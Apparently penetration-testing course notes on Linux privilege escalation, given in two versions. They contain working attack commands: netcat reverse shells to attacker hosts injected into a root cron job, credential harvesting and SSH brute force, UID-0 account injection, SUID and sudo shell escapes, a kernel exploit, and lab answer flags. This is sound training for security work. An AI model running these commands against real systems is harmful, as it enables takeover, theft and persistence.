# Linux Privilege Escalation

## Overview

Effective privilege escalation on Linux demands disciplined reconnaissance, precise analysis of trust boundaries, and carefully executed exploits. This guide mirrors the structure and technical depth of the Windows privilege escalation guide: clear sections, actionable commands, and reusable tradecraft designed for penetration testers and red-team operators. The focus is on techniques and workflows—not lab-specific walkthroughs.

## Learning Objectives

- Build a comprehensive Linux enumeration workflow covering identity, processes, networking, storage, and permissions.
- Identify exposed confidential information across user artifacts and system telemetry.
- Abuse writable jobs, binaries, and authentication stores to weaponize privilege boundaries.
- Escalate via system components (SUID, sudo, kernel) with repeatable, low-noise techniques.

## Table of Contents

1. [Enumerating Linux](#1-enumerating-linux)  
   1.1 [Linux Privilege Model Basics](#11-linux-privilege-model-basics)  
   1.2 [Manual Enumeration Workflow](#12-manual-enumeration-workflow)  
   1.3 [Automated Enumeration](#13-automated-enumeration)  
2. [Exposed Confidential Information](#2-exposed-confidential-information)  
   2.1 [User Trails & Shell Artifacts](#21-user-trails--shell-artifacts)  
   2.2 [System Trails & Live Telemetry](#22-system-trails--live-telemetry)  
3. [Insecure File Permissions](#3-insecure-file-permissions)  
   3.1 [Writable Scheduled Jobs](#31-writable-scheduled-jobs)  
   3.2 [Writable Authentication Stores](#32-writable-authentication-stores)  
4. [Insecure System Components](#4-insecure-system-components)  
   4.1 [SUID Programs & Capabilities](#41-suid-programs--capabilities)  
   4.2 [Sudo Misconfigurations](#42-sudo-misconfigurations)  
   4.3 [Kernel Vulnerabilities](#43-kernel-vulnerabilities)

---

# 1. Enumerating Linux

Enumeration is the backbone of every Linux escalation. Start broad, capture facts, then refine targets.

## 1.1 Linux Privilege Model Basics

### Filesystem Permissions

```bash
ls -l /etc/shadow
# -rw-r----- 1 root shadow 1762 May  2 09:31 /etc/shadow
```

- Owner/group/others each have `rwx` flags.
- Directories treat `x` as “traverse” (enter) and `r` as “list entries.”

### Real vs. Effective UID/GID

```bash
ps u -C passwd
grep Uid /proc/<pid>/status
```

- Real UID = launching user.  
- Effective UID = permissions enforced; SUID/SGID binaries set this to file owner/group.

## 1.2 Manual Enumeration Workflow

### Identity & Group Recon

```bash
whoami
id
cat /etc/passwd
groups
sudo -l          # if password known
```

- Flag service accounts, shell-bearing users, and privileged groups (`sudo`, `docker`, `lxd`, `adm`).

### Host & OS Fingerprinting

```bash
hostnamectl
cat /etc/os-release
uname -a
lsb_release -a      # if present
```

- Capture distro, release, kernel, architecture for exploit matching.

### Processes & Services

```bash
ps aux --sort=-%mem | head
systemctl list-units --type=service --state=running
netstat -plant | grep LISTEN     # or ss -plant
```

- Prioritize root-owned interpreters, custom daemons, and backup/automation scripts.

### Network & Routing

```bash
ip addr show
ip route show
ss -anptu
```

- Multi-homed hosts indicate pivot potential; loopback-only services often hide local escalation vectors.

### Firewall / Packet Filters

```bash
sudo iptables -L -n -v
sudo ufw status verbose
sudo firewall-cmd --list-all
cat /etc/iptables/rules.v4 2>/dev/null
```

- Without sudo, look for persisted configs created by `iptables-save`, `firewalld`, or `nftables`.

### Scheduled Jobs

```bash
ls -lah /etc/cron.*
cat /etc/crontab
crontab -l
sudo crontab -l
systemctl list-timers --all
```

- Note scripts executed as root but stored in user-writable directories (`/home/*/.scripts`, `/opt`, `/usr/local/bin`).

### Package Inventory

```bash
dpkg -l | tee /tmp/pkglist      # Debian/Ubuntu
rpm -qa | tee /tmp/pkglist      # RHEL/CentOS
```

- Cross-reference versions with CVE feeds or `searchsploit`.

### Writable Paths & Binaries

```bash
find / -writable -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
find / -perm -2 -type f 2>/dev/null         # world-writable files
```

- Focus on directories intersecting with PATH, cron, systemd, or service binaries.

### Storage & Mounts

```bash
lsblk
cat /etc/fstab
mount | column -t
findmnt -t nfs,cifs
```

- Unmounted partitions or network shares may hold credentials or backups.

### Kernel Modules

```bash
lsmod
/sbin/modinfo <module>
```

- Third-party drivers often introduce attack surface.

### Special Permissions & Capabilities

```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
/usr/sbin/getcap -r / 2>/dev/null
```

- Feed results into GTFOBins or craft custom payloads.

## 1.3 Automated Enumeration

Automation supplements—not replaces—manual work.

### unix-privesc-check

```bash
/usr/bin/unix-privesc-check standard > /tmp/upc-standard.txt
/usr/bin/unix-privesc-check detailed > /tmp/upc-detailed.txt
```

- Standard: quick, minimal noise.  
- Detailed: follows file handles/scripts, more false positives but deeper coverage.

### LinEnum

```bash
wget http://<attacker>/LinEnum.sh -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh -r report -e /tmp/linenum.log
```

- Summarizes cron, SUID, capabilities, network, and writable directories.

### LinPEAS

```bash
wget http://<attacker>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.log
```

- Color-coded output highlights “High” and “Very High” priority findings.

### Recommended Flow

1. Manual enumeration for context.  
2. Run 1–2 automated tools.  
3. Merge findings, remove duplicates, prioritize escalation paths.

---

# 2. Exposed Confidential Information

Credentials leak everywhere: dotfiles, history, logs, and live traffic. Harvest them before resorting to complex exploits.

## 2.1 User Trails & Shell Artifacts

### Dotfiles & History

```bash
ls -a ~
tail -n 200 ~/.bash_history
grep -R "password\|token\|secret" ~/.*
```

- Inspect `~/.config`, `~/.aws`, `~/.kube`, `~/.docker`, `~/.gnupg`, `~/.ssh/`.

### Environment Variables & Startup Scripts

```bash
env | sort
grep -R "export" ~/.bashrc ~/.profile ~/.bash_profile /etc/profile /etc/bash.bashrc
```

- Variables like `DB_PASS`, `API_KEY`, `SCRIPT_CREDENTIALS` often hold plaintext secrets.

### Credential Reuse & Wordlists

```bash
crunch 6 6 -t Lab%%% -o /tmp/wordlist
hydra -l eve -P /tmp/wordlist ssh://192.168.50.214 -t 4 -V
```

- Seed wordlists with discovered patterns; test across local users, services, VPNs, and sudo.

### SSH Keys

```bash
grep -R "BEGIN RSA PRIVATE KEY" -n /home /root 2>/dev/null
```

- Copy readable private keys; attempt authentication or crack `id_rsa` with `ssh2john`.

## 2.2 System Trails & Live Telemetry

### Process Monitoring

```bash
watch -n 1 "ps aux | grep -Ei 'pass|key|token|cred'"
sudo strings /proc/<pid>/environ | tr '\0' '\n'
```

- Look for `sshpass`, backup scripts, or daemons embedding credentials in arguments or environment variables.

### Packet Capture

```bash
sudo tcpdump -i lo -A | grep -Ei "pass|token|auth"
sudo tcpdump -i any port 389 -w /tmp/ldap.pcap
```

- Loopback captures expose services bound only to localhost; sniff HTTP basic auth, LDAP binds, SMTP logins.

### Logs & Journals

```bash
grep -Ri "password" /var/log 2>/dev/null
journalctl -u <service> | grep -Ei "auth|err|secret"
```

- Debug logging tiers frequently dump database or API credentials.

### Systemd & Service Configs

```bash
systemctl cat <service>
cat /etc/systemd/system/<service>.service
```

- Inspect `Environment=`, `ExecStart`, and helper scripts for stored secrets.

---

# 3. Insecure File Permissions

Writable artifacts executed by privileged contexts provide deterministic escalation routes.

## 3.1 Writable Scheduled Jobs

### Finding Vulnerable Jobs

```bash
grep CRON /var/log/syslog 2>/dev/null | tail
cat /etc/crontab
find /etc/cron.* -type f -exec ls -lah {} \;
systemctl list-timers --all
```

- Note any job running as root but residing in user-writable directories (`/home/*/.scripts`, `/tmp`, `/opt`).

### Weaponization Blueprint

1. Confirm file ownership/permissions.
2. Backup original script.
3. Inject payload (reverse shell, user creation, binary drop).
4. Start listener (`nc -lnvp <port>`) or monitor logs.
5. Restore original content post-execution if stealth is required.

### Sample Reverse Shell Payload

```bash
cat <<'EOF' >> /home/joe/.scripts/user_backups.sh
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f
EOF
nc -lnvp 4444
```

## 3.2 Writable Authentication Stores

### /etc/passwd Injection

```bash
ls -l /etc/passwd
openssl passwd -6 'P@ssw0rd!'      # SHA512 hash
echo 'root2:$6$hash:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su - root2
```

- UID/GID `0` grants full root access. Prefer SHA512 (`-6`) to ensure compatibility with modern pam configs.

### SSH Authorized Keys

```bash
find / -type f -name authorized_keys -writable 2>/dev/null
echo "ssh-ed25519 AAAAC3..." >> /root/.ssh/authorized_keys
```

- Plant keys in writable `authorized_keys` for privileged users to gain persistent access.

### Application Configs

```bash
grep -R "password" /etc /opt /var/www 2>/dev/null | head
```

- Extract DB/service credentials from config files, then authenticate as those accounts or re-use passwords for local escalation.

---

# 4. Insecure System Components

When user-space avenues dry up, attack the primitives enforcing privilege separation.

## 4.1 SUID Programs & Capabilities

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

- Feed results into GTFOBins; focus on interpreters, archive tools, network utilities, and custom binaries.

### Example Exploits

- **SUID `find`:**

```bash
find /tmp -exec /bin/sh -p \; -quit
```

- **Perl with `cap_setuid+ep`:**

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## 4.2 Sudo Misconfigurations

### Enumerate Privileges

```bash
sudo -l
```

- Analyze allowed commands for shell escapes, file edits, service control, or interpreter pivots.

### Common Attack Patterns

- **less/more/vim**: `sudo less /etc/passwd` → `! /bin/sh`
- **apt-get**: `sudo apt-get changelog apt` → inside pager run `!/bin/sh`
- **systemctl**: `sudo systemctl status <service>` → press `! /bin/sh`
- **tar/rsync/find**: Use built-in execution hooks (`--checkpoint-action`, `--use-compress-program`, `-exec`).

### MAC Enforcement

```bash
sudo aa-status
getenforce
```

- AppArmor/SELinux may block sudo-based payloads (e.g., `tcpdump`). If so, pivot to another allowed command or adjust profile when authorized.

## 4.3 Kernel Vulnerabilities

### Recon

```bash
uname -a
cat /etc/os-release
```

- Document kernel, distro, architecture for exploit matching.

### Research & Selection

```bash
searchsploit "linux kernel <distro> <version> privilege"
```

- Filter by kernel range, exploit stability, and required dependencies.

### Compile & Execute

```bash
scp exploit.c user@target:/tmp/
gcc /tmp/exploit.c -o /tmp/exploit
/tmp/exploit
id
```

- Prefer compiling on target to avoid dependency mismatches. Clean up binaries and logs per engagement rules.

---

## Closing Notes

This guide provides a Linux privilege escalation playbook aligned with the clarity and depth of the Windows edition. Apply the sections sequentially, capture findings methodically, and choose the lowest-risk technique that meets engagement objectives. Update your local copy whenever new SUID vectors, sudo misconfigs, or kernel exploits emerge to keep the playbook current.
# Linux Privilege Escalation

## Overview

This guide tracks the structure and learning flow for Linux privilege escalation techniques. Detailed walkthroughs will be added in later iterations.

## Table of Contents

- [Learning Module 18: Linux Privilege Escalation](#learning-module-18-linux-privilege-escalation)
  - [Learning Objectives](#learning-objectives)
  - [Learning Units](#learning-units)
    - [Enumerating Linux](#enumerating-linux)
      - [Learning Objectives](#enumerating-linux-learning-objectives)
      - [18.1.1 Understanding Files and Users Privileges on Linux](#1811-understanding-files-and-users-privileges-on-linux)
      - [18.1.2 Manual Enumeration](#1812-manual-enumeration)
      - [18.1.3 Automated Enumeration](#1813-automated-enumeration)
      - [Resources and Labs](#enumerating-linux-resources-and-labs)
    - [Exposed Confidential Information](#exposed-confidential-information)
      - [Learning Objectives](#exposed-confidential-information-learning-objectives)
      - [18.2.1 Inspecting User Trails](#1821-inspecting-user-trails)
      - [18.2.2 Inspecting Service Footprints](#1822-inspecting-service-footprints)
      - [Resources and Labs](#exposed-confidential-information-resources-and-labs)
    - [Insecure File Permissions](#insecure-file-permissions)
      - [Learning Objectives](#insecure-file-permissions-learning-objectives)
      - [18.3.1 Abusing Cron Jobs](#1831-abusing-cron-jobs)
      - [18.3.2 Abusing Password Authentication](#1832-abusing-password-authentication)
      - [Resources and Labs](#insecure-file-permissions-resources-and-labs)
    - [Insecure System Components](#insecure-system-components)
      - [Learning Objectives](#insecure-system-components-learning-objectives)
      - [18.4.1 Abusing Setuid Binaries and Capabilities](#1841-abusing-setuid-binaries-and-capabilities)
      - [18.4.2 Abusing Sudo](#1842-abusing-sudo)
      - [18.4.3 Exploiting Kernel Vulnerabilities](#1843-exploiting-kernel-vulnerabilities)
      - [Resources and Labs](#insecure-system-components-resources-and-labs)
  - [MITRE ATT&CK Context](#mitre-attck-context)
  - [Module Scope and Approach](#module-scope-and-approach)

## Learning Module 18: Linux Privilege Escalation

### Learning Objectives

- Understand how systematic enumeration uncovers misconfigurations and vulnerabilities.
- Recognize how each learning unit contributes to achieving elevated permissions on Linux targets.
- Align observed behaviors with MITRE ATT&CK privilege escalation tactics to aid reporting and detection engineering.

### Learning Units

#### Enumerating Linux

Investigate host details, user contexts, running services, installed packages, and kernel data to build a privilege escalation map.

#### Exposed Confidential Information

Identify sensitive artifacts (keys, credentials, service tokens) that can be leveraged for lateral movement or privilege escalation.

#### Insecure File Permissions

Assess binaries, scripts, and configuration files for writable or misconfigured permissions that enable execution hijacking.

#### Abusing System Linux Components

Target misconfigurations or vulnerabilities in scheduled tasks, system services, or privileged binaries to obtain elevated access.

### MITRE ATT&CK Context

Privilege escalation constitutes a core MITRE ATT&CK tactic in which adversaries seek to leverage user permissions to access restricted resources.

### Module Scope and Approach

This module centers on Linux-based targets. We focus on enumerating Linux machines, defining what constitutes Linux privileges, and highlighting common escalation paths driven by insecure file permissions and misconfigured system components.

## Enumerating Linux

### Enumerating Linux Learning Objectives

- Frame Linux privilege mechanics before attempting exploits.
- Build manual recon habits for bespoke misconfigurations.
- Apply automation to amplify—but not replace—analyst judgment.

### 18.1.1 Understanding Files and Users Privileges on Linux

- Everything is a file: files, dirs, devices, sockets all expose permissions.
- Permission triad per owner/group/others with `r`, `w`, `x`.
- Files: `r` read bytes, `w` edit, `x` execute; directories: `r` list, `w` add/remove, `x` traverse (even blind if names known).
- Command: `ls -l /etc/shadow` → `-rw-r----- 1 root shadow ... /etc/shadow`.
  - First char = type; next six show owner and group perms; final three govern others.
  - Owner `rw-`, group `r--`, others `---`; execute unset, so file cannot run.
- Mastering this readout lets us spot mis-set bits during escalation hunts.

### 18.1.2 Manual Enumeration

- Manual passes surface edge cases automation misses; expect distro-specific adjustments.

#### Identity and Accounts

- `id` after foothold (e.g., SSH as `joe`): `uid=1000(joe) gid=1000(joe) groups=...`; confirms UID/GID plus auxiliary groups.
- `cat /etc/passwd` to list all principals, including service accounts (`www-data`, `sshd`) and interactive users (`joe`, `eve`).
- Field decode: login, placeholder `x` (hash in `/etc/shadow`), UID (root always 0, regular start at 1000), GID, gecos, home, shell. `/usr/sbin/nologin` denotes non-login service accounts.
- Target high-privilege or misconfigured users for next steps.

#### Hostname and OS Fingerprinting

- `hostname` → `debian-privesc`; use naming conventions to infer role.
- `cat /etc/issue`, `cat /etc/os-release`, `uname -a` to nail distro, version, kernel (`Debian 10 buster`, `4.19.0-21-amd64`), and architecture. Precise data is mandatory before launching kernel exploits.
- Treat kernel exploits carefully; test locally when possible to avoid watchdog alerts.

#### Process Recon

- `ps aux` (or `ps axu`) surfaces privileged daemons (`sshd`, `apache2`, `polkitd`, `gdm3`, backup scripts). Correlate with CVE research or config review.
- Filter by user or command to isolate unusual services quickly.

#### Network Surface

- `ip a` to enumerate interfaces, IPs, and loopback bindings; sample host shows `ens192` (192.168.50.0/24) plus `ens224` (172.16.60.0/24), signaling pivot potential.
- `routel` (or `route -n`) to dump routing table; watch for dual gateways, static routes, IPv6 entries.
- `ss -anp` (or `netstat -anp`) to list listeners and sessions: e.g., `0.0.0.0:22`, `*:80`, loopback `127.0.0.1:631`, active SSH session to attack box. Loopback-only services often hide privilege-escalation vectors.

#### Firewall Insight

- Without root, look for persisted rules: `cat /etc/iptables/rules.v4` (default for `iptables-persistent`) or search for `iptables-save` dumps.
- Example snippet exposes explicit allow on TCP 1999; log such anomalies for later use (local port-binding, tunneling).

#### Scheduled Tasks

- `ls -lah /etc/cron*` to inventory system-wide schedules (hourly/daily/weekly/monthly).
- `crontab -l` (current user) and `sudo crontab -l` (root if permitted) to view user-specific jobs; sample root job: `* * * * * /bin/bash /home/joe/.scripts/user_backups.sh`.
- Verify file ownership/permissions (`/home/joe/.scripts`) because writable cron payloads are high-value.

#### Packages and Services

- `dpkg -l` (Debian) or `rpm -qa` (RHEL) lists installed software; confirm versions such as `apache2 2.4.38-3+deb10u7` for targeted CVE matching.
- Combine with open ports to prioritize exploitation research.

#### Writable Paths

- `find / -writable -type d 2>/dev/null` to catch directories the current user can modify beyond home tree.
- Highlight nonstandard writable paths like `/home/joe/.scripts`; cross-reference with cron/systemd jobs.

#### Storage and Mounts

- `cat /etc/fstab` to understand boot-time mounts and options (e.g., root ext4 UUID, swap, CD-ROM autofs entries).
- `mount` for real-time view—detect tempfs, autofs, bind mounts not in `fstab`.
- `lsblk` shows block devices/partitions (`sda1` root, `sda5` swap, `sr0` ISO); unmounted partitions may harbor credentials or backups.

#### Kernel Modules

- `lsmod` to list loaded modules (e.g., `binfmt_misc`, `vmw_balloon`, `libata`).
- `/sbin/modinfo <module>` to capture version, path, deps, signing info (`libata.ko`, `version 3.00`, `vermagic 4.19.0-21-amd64`). Pair with exploit DB for driver-level privilege escalations.

#### Special Permission Bits

- `setuid` / `setgid` bits (`s`) let binaries run with owner/group eUID/eGID (e.g., root), bypassing caller privileges.
- `find / -perm -u=s -type f 2>/dev/null` enumerates SUID binaries (`/usr/bin/passwd`, `pkexec`, `sudo`, `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`, `/usr/sbin/pppd`, etc.).
- Any hijackable SUID-root binary can hand over a root shell; test known abuse chains (GTFOBins, custom payloads).

#### Reference Compendiums

- g0tmi1k Linux privilege escalation checklist.
- PayloadsAllTheThings Linux PrivEsc notes.
- HackTricks Linux PrivEsc chapter for rapid TTP lookup.

### 18.1.3 Automated Enumeration

- Use automation after manual triage to save time and capture broad misconfigs.
- `unix-privesc-check` (Kali: `/usr/bin/unix-privesc-check`) supports `standard` (fast) and `detailed` (slow, deeper). Run without args to view usage.
- Workflow: transfer script → `./unix-privesc-check standard > output.txt` → review highlights (e.g., warning if `/etc/passwd` is world-writable).
- `detailed` mode inspects open file handles and script includes; expect noise but useful for niche paths.
- Complementary tooling: `LinEnum.sh`, `linpeas.sh` (PEASS). Always validate results manually because custom configs may fall outside signatures.
- Document findings immediately so downstream exploitation steps are scoped and reproducible.

### Enumerating Linux Resources and Labs

- Start `Linux Privilege Escalation - Manual Enumeration - VM #1`; lab IPs may differ from guide examples.
- Knowledge checks:
  - Linux distribution codename? → `buster`.
  - `crontab` flag to list current user jobs? → `-l`.
  - Term for inherited privileged UID when running SUID binary? → `SUID`.
  - Flag hunt: enumerate SUID binaries on VM #1; the flag resides inside one of them.
- References: g0tmi1k compendium, PayloadsAllTheThings, HackTricks (Linux PrivEsc).
- Reminder: automation aids but manual verification + local exploit testing remain mandatory.

## Exposed Confidential Information

### Exposed Confidential Information Learning Objectives

- Understand user history/dotfiles as credential sources.
- Harvest credentials from user activity trails.
- Extract secrets from service/system telemetry without crashing hosts.

### 18.2.1 Inspecting User Trails

- Prioritize low-effort wins (history files, dotfiles, exported secrets) before deep exploits.

#### Hidden Artifacts

- `ls -a ~` lists dotfiles (`.bashrc`, `.bash_history`, `.ssh/`); search for creds with `grep -i pass`.
- `tail -n 50 ~/.bash_history` may reveal copy/pasted passwords, tokens, or sudo invocations.

#### Environment Variables

- `env` on the Debian target exposes `SCRIPT_CREDENTIALS=lab` amid other session vars.
```
SCRIPT_CREDENTIALS=lab
USER=joe
...
```
- `cat ~/.bashrc` confirms persistence via `export SCRIPT_CREDENTIALS="lab"`; any new shell loads it.
- Best practice is SSH keys + passphrases, not plaintext exports.

#### Direct Credential Reuse

- `su - root`, supply leaked value → `root@debian-privesc:~# whoami` returns `root`.
- Maintain OPSEC: note source (`.bashrc`) so defenders can remediate.

#### Wordlist Derivation & Brute Force

- Use the leak as a seed for other accounts:
  - `crunch 6 6 -t Lab%%% > wordlist` (min=max=6, pattern `Lab` + 3 digits).
  - `head wordlist` shows `Lab000 ... Lab009 ...`.
- `hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V` brute-forces SSH:
```
[ATTEMPT] ... "Lab123"
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
```
- `ssh eve@192.168.50.214` then provide `Lab123` to land an interactive shell.

#### Privilege Escalation via Eve

- `sudo -l` (inside eve session) discloses `User eve may run the following commands on debian-privesc: (ALL : ALL) ALL`.
- `sudo -i` elevates; `root@debian-privesc:/home/eve# whoami` confirms root context.
- Key idea: single exposed variable can cascade into multi-user compromise.

### 18.2.2 Inspecting Service Footprints

- System daemons and troubleshooting workflows often leak credentials in process listings or packet captures.

#### Process Monitoring

- `watch -n 1 "ps aux | grep -i pass"` snapshots privileged processes every second.
```
root 16880 ... sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
```
- Even root-owned processes reveal command-line arguments; scrape for `sshpass`, `mysql -p`, etc.

#### Network Sniffing

- Verify sudo rights: `sudo -l` may list `tcpdump` even if shell lacks full root.
- `sudo tcpdump -i lo -A | grep -i pass` captures loopback traffic, prints ASCII payloads:
```
...user:root,pass:lab -
```
- Loopback captures highlight local services blocked externally; sniff before pivoting.
- Reminder: tcpdump needs raw socket access; if delegated, treat as privilege-escalation bridge.

### Exposed Confidential Information Resources and Labs

- Labs:
  - `Linux Privilege Escalation - Inspecting User Trails - VM #1`
  - `Linux Privilege Escalation - Inspecting User Trails - VM #2`
- Knowledge checks:
  - Command to list sudoer capabilities? → `sudo -l`.
  - VM2 flag in another user’s file? → `OS{09e4705ce4743ffa660c6be07ea9b431}`.
- Workflow recap:
  - Enumerate dotfiles/history, leak env secrets.
  - Derive wordlists, brute force adjacent users, chain sudo.
  - Monitor processes/pcaps for service credentials.

## Insecure File Permissions

### Insecure File Permissions Learning Objectives

- Abuse writable scheduled tasks to hijack root execution paths.
- Leverage lax file permissions (e.g., `/etc/passwd`) to mint privileged accounts.

### 18.3.1 Abusing Cron Jobs

- Goal: find root-run cron scripts that reside in user-writable paths, inject payload.

#### Locate Scheduled Task

- `grep "CRON" /var/log/syslog` (or `/var/log/cron.log`) to confirm runtime and owner:
```
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
- Job fires every minute under root, executing `/home/joe/.scripts/user_backups.sh`.

#### Inspect Script and Permissions

- `cat /home/joe/.scripts/user_backups.sh` → simple `cp -rf /home/joe/ /var/backups/joe/`.
- `ls -lah /home/joe/.scripts/user_backups.sh` shows `-rwxrwxrw-` (world-writable). Any local user can edit root-executed script.

#### Weaponize Script

- Append reverse shell (or any root action) while keeping original logic if stealthy:
```
cd ~/.scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```
- Double-check final payload with `cat user_backups.sh`.

#### Catch Root Shell

- Start listener on attacker box: `nc -lnvp 1234`.
- Wait ≤60s for cron to run; expect connection from target:
```
connect to [192.168.118.2] from 192.168.50.214
# id
uid=0(root) gid=0(root) groups=0(root)
```
- Cleanup after confirming access (restore script, clear logs) if required by ROE.

### 18.3.2 Abusing Password Authentication

- Mis-set permissions on `/etc/passwd` let attackers inject password hashes that override `/etc/shadow`.

#### Generate Hash

- `openssl passwd w00t` → returns `Fdzt.eqJQ4s0g` (algorithm varies by OpenSSL build; DES/MD5 both understood by PAM).

#### Append Privileged Account

- `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd`.
  - Format: `user:hash:UID:GID:comment:home:shell`.
  - UID/GID `0` grants full root privileges; ensure newline at EOF.

#### Validate Access

- `su root2`, enter plaintext password (`w00t`), then `id` to confirm `uid=0`.
- Remove rogue entry post-testing to avoid stability issues.

#### Notes

- Some modern PAM configs ignore DES hashes—prefer stronger formats if target supports them (`openssl passwd -6` for SHA512).
- Organizations sometimes relax permissions during vendor integrations; always check `ls -l /etc/passwd` and `stat` output early.

### Insecure File Permissions Resources and Labs

- Labs:
  - `Linux Privilege Escalation - Abusing Cron Jobs - VM #1`
  - `Linux Privilege Escalation - Abusing Cron Jobs - VM #2`
- Knowledge checks:
  - Cron log file path referenced above? → `/var/log/syslog` (distros may route to `/var/log/cron.log`).
  - VM2 flag after exploiting cron? → `OS{b267f11a05c207c277ea945f1cb50a9f}`.
- Workflow recap:
  - Enumerate cron/systemd timers + permissions.
  - Inject controlled payloads, collect elevated shells.
  - Audit authentication stores (`/etc/passwd`, `/etc/shadow`, PAM configs) for writable paths.

## Insecure System Components

### Insecure System Components Learning Objectives

- Abuse SUID binaries and Linux capabilities to inherit root context.
- Pivot through overly broad sudo rules despite MAC controls.
- Enumerate kernel version/architecture, match known exploits, and execute responsibly.

### 18.4.1 Abusing Setuid Binaries and Capabilities

- Real UID tracks the caller; effective UID (`euid`) dictates permission checks. SUID binaries purposely run with owner euid (often root).

#### SUID Refresher

- Launch `passwd`, leave prompt open to keep process alive.
- `ps u -C passwd` shows process owned by root even when joe started it.
- Inspect UIDs via `/proc/<pid>/status`: `grep Uid /proc/1932/status` → `Uid: 1000 0 0 0` (real=joe, effective/saved/fs=root).
- `ls -asl /usr/bin/passwd` reveals `-rwsr-xr-x`; `s` bit set on owner permissions.

#### Exploit Writable/Unexpected SUID Binaries

- Enumerate: `find / -perm -u=s -type f 2>/dev/null`.
- If `find` itself has SUID, leverage GTFOBins pattern:
```
find /home/joe/Desktop -exec /usr/bin/bash -p \;
```
- Resulting shell inherits `euid=0`; confirm with `id` / `whoami`.

#### Capabilities

- Enumerate recursively: `/usr/sbin/getcap -r / 2>/dev/null`.
  - Sample hits: `/usr/bin/perl = cap_setuid+ep`, `/usr/bin/ping = cap_net_raw+ep`.
- Capable binaries can escalate without classic SUID flags.
- Example abuse (per GTFOBins):
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
- Shell pops with `uid=0`; track original gid to maintain OPSEC.

### 18.4.2 Abusing Sudo

- `sudo -l` enumerates allowed commands: `(ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get`.
- Not all entries are equally abusable; MAC frameworks (AppArmor/SELinux) can block payloads.

#### Tcpdump Attempt Blocked by AppArmor

- Follow GTFOBins recipe using `-z` hook:
```
COMMAND='id'
TF=$(mktemp); echo "$COMMAND" > "$TF"; chmod +x "$TF"
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z "$TF" -Z root
```
- Syslog exposes denial: `apparmor="DENIED" ... profile="/usr/sbin/tcpdump" ... requested_mask="x"`.
- Verify AppArmor enforcement with `aa-status` (requires root).

#### Apt-Get Success Path

- `sudo apt-get changelog apt` drops into `less`; type `!/bin/sh` to spawn root shell.
- Validate: `# id` returns `uid=0(gid=0)`.
- Review `/etc/sudoers` for similar misconfigurations; least privilege should restrict interactive pagers/editors.

### 18.4.3 Exploiting Kernel Vulnerabilities

- Always fingerprint OS + kernel before hunting exploits.

#### Recon

- `cat /etc/issue` → `Ubuntu 16.04.4 LTS`.
- `uname -r` → `4.4.0-116-generic`; `arch` → `x86_64`.

#### Search and Prep Exploit

- On attacker box: `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`.
- Choose `linux/local/45010.c` (CVE-2017-16995 BPF LPE).
- Copy & rename: `cp /usr/share/exploitdb/exploits/linux/local/45010.c .` then `mv 45010.c cve-2017-16995.c`.
- Transfer to target: `scp cve-2017-16995.c joe@192.168.123.216:`.

#### Compile & Execute

- On target: `gcc cve-2017-16995.c -o cve-2017-16995`.
- Inspect binary: `file cve-2017-16995` (confirm ELF64, correct interpreter).
- Run: `./cve-2017-16995` → exploit crafts eBPF payload, overwrites creds, launches root shell.
- Always clean up binaries and document CVE/IOCs for reporting.

### Insecure System Components Resources and Labs

- Labs:
  - `Linux Privilege Escalation - Abusing Setuid Binaries and Capabilities - VM #1`
  - `Linux Privilege Escalation - Abusing Setuid Binaries and Capabilities - VM #2`
  - `Linux Privilege Escalation - Abusing Sudo - VM #1`
  - `Linux Privilege Escalation - Abusing Sudo - VM #2`
- Knowledge checks:
  - Utility for enumerating capabilities? → `getcap`.
  - Kernel module enforcing MAC in sudo scenario? → `apparmor`.
  - VM2 sudo lab flag? → `OS{d8ee6f06c1ca94a50e489fd46f252f44}`.
- Workflow recap:
  - Enumerate SUID/capability-bearing binaries, test GTFOBins payloads safely.
  - Review sudo rules; consider MAC profiles before execution.
  - Profile kernel/OS, shortlist exploits with `searchsploit`, compile for matching architecture, and run with rollback plan.